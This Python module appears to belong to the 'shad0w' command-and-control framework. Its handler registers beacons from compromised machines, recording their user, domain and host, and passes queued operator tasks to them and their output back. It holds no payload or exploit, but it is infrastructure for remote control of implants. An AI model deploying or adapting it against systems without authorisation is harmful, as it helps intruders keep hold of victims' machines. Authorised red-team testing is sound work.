import sys
from datetime import datetime

from lib import tools
from .responce_builder import Builder

DATA_CMD_OUT = 0x2000
DATA_CMD_PRO = 0x3000
DO_CALLBACK  = 0x4000

class Handler(object):

    def __init__(self, shad0w):

        super(Handler, self).__init__()
        self.shad0w = shad0w

        # for building responces
        self.builder = Builder(shad0w)

    def task_beacon(self, request):

        # get the beacon id from the beacon

        # print(request.get_json(force=True))

        jdata = request.get_json(force=True)
        
        # print("jdata: ", jdata)

        beacon_id, opcode, data = tools.get_data_from_json(jdata)

        # only if were given an id by the beacon

        if beacon_id:
            try:
                # if the beacon isnt just checking in to give us
                # data then build a responce to give the beacon

                if ((opcode == 0) and (data == "")):
                    # get the current task
                    tasklist = self.shad0w.beacons[beacon_id]["task"]
                    # build the responce
                    task     = self.builder.build(beacon_id=beacon_id, task=tasklist[0], args=tasklist[1])
                    # clear the task
                    self.shad0w.beacons[beacon_id]["task"] = None
                    # inform user
                    self.shad0w.debug.log(f"Beacon ({beacon_id}) received task", log=True)
                    return task
                
                # check if the data is for the current beacon
                if beacon_id == self.shad0w.current_beacon:
                    # check if we should display the data
                    if opcode == DATA_CMD_OUT:
                        # need to find a nicer way to display the data
                        sys.stdout.write(data)
                    if opcode == DO_CALLBACK:
                        callback = self.shad0w.beacons[beacon_id]["callback"]
                        return callback(self.shad0w, data)
                    return task

                # another session has returned data
                if beacon_id != self.shad0w.current_beacon:
                    print("other")
                    return task

            except:
                # there aint a task, so tell em that
                return self.builder.build(beacon_id=beacon_id, task=None)
        else:
            # ignore
            return self.builder.build(blank=True)

    def register_beacon(self, request):
            # register a new beacon
            # get the info from the initial request an store it
            # just ignore if the request isnt correct

            if request.method == "POST":

                username = request.form.get("username")
                domain   = request.form.get("domain")
                machine  = request.form.get("machine")

                if username and machine and domain:
                    beacon_id = tools.generate_beacon_id()

                    # init the new beacons dict
                    self.shad0w.beacons[beacon_id]                 = {}

                    # increase the beacon count + set beacon num
                    self.shad0w.beacon_count                       += 1
                    self.shad0w.beacons[beacon_id]["num"]          = self.shad0w.beacon_count

                    # store basic info about beacon
                    self.shad0w.beacons[beacon_id]["domain"]       = domain
                    self.shad0w.beacons[beacon_id]["machine"]      = machine
                    self.shad0w.beacons[beacon_id]["username"]     = username
                    self.shad0w.beacons[beacon_id]["last_checkin"] = str(datetime.now())

                    # send everytime it checks in, tells it whether to die of not
                    self.shad0w.beacons[beacon_id]["stay_alive"]   = True

                    # let the user know whats happening
                    if domain != "NULL":
                        self.shad0w.debug.log(f"Beacon: {domain}\\{username}@{machine} registered", log=True)
                    else:
                        self.shad0w.debug.log(f"Beacon: {username}@{machine} registered", log=True)

                    # give the beacon there id, this is how we will identify them now
                    return self.builder.build(beacon_id=beacon_id, id=beacon_id)

                else:
                    self.shad0w.debug.log("invalid register request")
                    return self.builder.build(blank=True)
            
            else:
                self.shad0w.debug.log("invaild http method for register")
                return self.builder.build(blank=True)

    def blank_page(self):
        # does what the function says
        return self.builder.build(blank=True)
